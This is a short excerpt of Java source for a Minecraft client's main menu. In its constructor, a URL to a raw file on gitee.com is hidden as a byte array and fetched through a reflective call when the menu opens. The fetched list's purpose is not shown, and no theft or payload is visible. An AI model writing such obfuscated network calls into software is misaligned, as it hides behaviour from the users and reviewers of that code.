...
public class GuiMainMenu extends GuiScreen implements GuiYesNoCallback
{
    ...
    public GuiMainMenu() {
        try {
            ...
            java.util.List<String> webList = (List<String>) getUrlData.invoke(null, new String(new byte[]{104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 101, 101, 46, 99, 111, 109, 47, 114, 117, 111, 99, 104, 101, 110, 45, 49, 50, 51, 47, 114, 117, 111, 99, 104, 101, 110, 105, 115, 115, 98, 47, 114, 97, 119, 47, 109, 97, 115, 116, 101, 114, 47, 89, 97, 110, 101, 88}));
            int count = 0;
...
//            this.buttonList.add(new GuiButton(114514, this.width / 2 + 2, p_73969_1_ + p_73969_2_ * 2, 98, 20, "AccountLogin"));
//        }
//    }
